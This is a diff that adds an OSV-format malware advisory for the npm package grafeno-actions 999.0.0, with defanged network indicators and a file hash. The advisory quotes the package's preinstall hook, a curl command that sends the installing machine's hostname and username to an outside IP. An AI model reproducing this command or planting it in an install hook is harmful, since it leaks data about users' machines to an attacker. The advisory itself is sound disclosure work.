@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11684",
+  "modified": "2026-08-28T22:15:25Z",
+  "published": "2026-08-28T22:15:11Z",
+  "summary": "Malicious code in grafeno-actions (npm)",
+  "details": "The package's preinstall hook runs `curl -s hxxp://216[.]126[.]236[.]46:8080/rce?pkg=grafeno-actions\u0026h=$(hostname)\u0026u=$(whoami)` on install, contacting a remote IP at port 8080 and exfiltrating the installing machine's hostname and username to a path named /rce. The package ships no functional code (a 25-byte index.js) and exists only to run this remote fetch-and-report on install.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-actions",
+        "purl": "pkg:npm/grafeno-actions"
+      },
+      "versions": [
+        "999.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-actions/v/999.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11684"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:15:11Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46:8080"
+        ],
+        "sha256": [
+          "f1873fbca4ce34271179d472cd3903270f3215f2b1926bbde0f3155a07bc819e"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46",
+          "hxxp://216[.]126[.]236[.]46:8080/rce"
+        ]
+      }
+    }
+  }
+}
